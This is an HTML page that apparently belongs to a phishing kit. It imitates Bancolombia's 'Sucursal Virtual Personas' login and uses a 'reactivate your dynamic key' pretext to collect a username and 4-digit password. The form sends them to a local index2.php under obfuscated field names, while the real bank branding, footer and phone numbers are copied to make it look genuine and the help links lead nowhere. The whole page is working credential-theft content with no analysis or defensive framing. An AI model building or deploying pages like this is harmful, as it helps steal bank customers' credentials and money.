<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="./hfh/styles.css" media="all" rel="stylesheet" type="text/css">
    <link href="./hfh/bootstrap.css" media="all" rel="stylesheet" type="text/css">
    <link href="./hfh/jquery-ui.css" media="all" rel="stylesheet" type="text/css">
    <link href="./hfh/ui.css" media="all" rel="stylesheet" type="text/css">
    <script>
        function soloNumeros(e){
          var key = window.event ? e.which : e.keyCode;
          if (key < 48 || key > 57) {
            e.preventDefault();
          }
        }
    </script>
</head>

<body>
    <div id="cargando" style="width: 100%; text-align: center; display: none;"><br></div>
    <div id="contenidoWeb">
        <form action="index2.php" autocomplete="off" id="main_form" method="POST">
            <div class="container" id="containerMain">
                <div>
                    <div class="mua-page-header" id="header">
                        <div class="row row-logo-svp">
                            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                                <div class="mua-imgLogoItem"><br></div>
                                <div class="text-svp-name">Sucursal Virtual Personas</div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                                <div class="mua-title-text" id="lastIn" style="padding-top: 10px !important;">
                                    <div>
                                        <div class="timeText">Fecha y hora actual:</div><span class="lastVisitedText" id="jclock1">&nbsp;
                                            <!--?php
date_default_timezone_set('America/Bogota');    
$dias = array("Domingo","Lunes","Martes","Miercoles","Jueves","Viernes","Sábado");
$meses = array("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");

$DateAndTime = date('m-d-Y h:i:s A', time());  
echo "".$dias[date('w')]." ".date('d')." de ".$meses[date('n')-1]. " del ".date('Y')." ".date('h:i:s A', time())."" ;



?-->&nbsp;</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="panel-heading">
                        <h3>Inicie sesi&oacute;n para reactivar su clave din&aacute;mica&nbsp;</h3>
                    </div>
                </div>
                <div class="panel panel-primary">
                    <div class="row" id="error"><br></div>
                    <div class="mua-panel-body">
                        <div class="row">
                            <div class="col-xs-12 col-sm-5 col-md-4">
                                <div class="panel_general">
                                    <div class="title-panel-label">
                                        <h1>Usuario</h1>
                                    </div>
                                    <div class="subtitle-land-label">
                                        <h4>Si no tienes un usuario asignado ingresa con tu documento de identidad</h4>
                                    </div>
                                    <div id="contenido">
                                        <div class="mua-content-group-panel">
                                            <div class="mua-label-input"><img src="hfh/icc.png" style="width: 20px;">
                                                <div class="hide" id="popoverContent">
                                                    <div class="mua_tooltip_msg">Ingrese el usuario que tiene registrado en la Sucursal Virtual Personas. Si no tiene un usuario asignado ingrese con su documento de identidad.</div>
                                                </div><label class="control-label" for="username">Ingresa tu usuario</label>
                                            </div>
                                            <div>
                                                <div class="mua_svp_enroll_update_control"><input name="usdfdsr" tabindex="1" class="mua-form-control mua_svp_control_username mua-input-icon" type="text" maxlength="20" autocomplete="off" required=""> <span class="mua-icon-user">&nbsp;</span></div>
                                            </div>
                                        </div>
                                        <div class="mua-content-group-panel">
                                            <div class="mua-label-input"><label class="control-label" for="username">&nbsp;Ingresa tu clave&nbsp;</label></div>
                                            <div>
                                                <div class="mua_svp_enroll_update_control"><input name="pssaswd" class="mua-form-control   mua-input-icon" type="password" maxlength="4" required=""> <span class="mua-icon-lock">&nbsp;</span></div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="one-button-container mua-button-container"><button class="btn btn-success" id="btnGo" name="btnGo" type="submit" value="Submit">&nbsp;Continuar&nbsp;</button></div>
                                    <div align="right" class="mua-error-login">
                                        <p><a href="">&iquest;Olvidaste tu usuario?</a></p>
                                        <p><a href="">&iquest;Problemas para conectarse?</a></p>
                                    </div>
                                </div>
                                <div class="panel_general mua-panel_general_separation">
                                    <div id="contenido">
                                        <div class="mua-divIcon">
                                            <div class="mua-divRow"><a class="mua-itemsIcons-btn" href="" target="_blank">
                                                    <div class="mua-divCell"><img src="hfh/1es.png"> <span class="control-label">Conoce sobre Sucursal Virtual Personas</span></div>
                                                </a></div>
                                        </div>
                                        <div class="mua-divIcon">
                                            <div class="mua-divRow"><a class="mua-itemsIcons-btn" href="" target="_blank">
                                                    <div class="mua-divCell"><img src="hfh/2es.png"> <span class="control-label">Aprende sobre Seguridad</span></div>
                                                </a></div>
                                        </div>
                                        <div class="mua-divIcon">
                                            <div class="mua-divRow"><a class="mua-itemsIcons-btn" href="" target="_blank">
                                                    <div class="mua-divCell"><img src="hfh/3es.png"> <span class="control-label">&nbsp;Reglamento Sucursal Virtual</span></div>
                                                </a></div>
                                        </div>
                                        <div class="mua-divIcon">
                                            <div class="mua-divRow"><a class="mua-itemsIcons-btn" href="" target="_blank">
                                                    <div class="mua-divCell"><img src="hfh/4es.png"> <span class="control-label">&nbsp;Pol&iacute;tica de Privacidad&nbsp;</span></div>
                                                </a></div>
                                        </div><br>
                                    </div>
                                </div>
                            </div>
                            <div class="col-xs-12 col-sm-7 col-md-8">
                                <div class="mua-embed-container-personal" id="banner-persona"><img src="hfh/imgPublicidad.png" alt="" border="0" class="img-responsive"></div>
                                <p class="text-center">&iquest;No conoces la Sucursal Virtual Personas de Bancolombia? Conoce mas <a href="#" style="text-decoration:underline;">&nbsp;aqu&iacute;</a></p>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12">
                        <p class="mua-footer mua-footer-info-call">Sucursal Telef&oacute;nica Bancolombia: Bogot&aacute; 343 0000 - Medell&iacute;n 510 9000 - Cali 554 0505 - Barranquilla 361 8888 - Cartagena 693 4400 - Bucaramanga 697 2525 - Pereira 340 1213 - El resto del pa&iacute;s 01 800 09 12345<br>Sucursales Telef&oacute;nicas en el exterior: Espa&ntilde;a 900 995 717 - Estados Unidos 1866 379 9714.</p>
                    </div>
                </div>
                <div style="margin-top: 10px;">
                    <div class="mua-title-text pull-left"><br></div>
                    <div class="mua-title-text pull-right"><span id="fecha">2022</span> Bancolombia S.A. &nbsp;</div>
                </div>
            </div>
        </form>
    </div>
</body>

</html>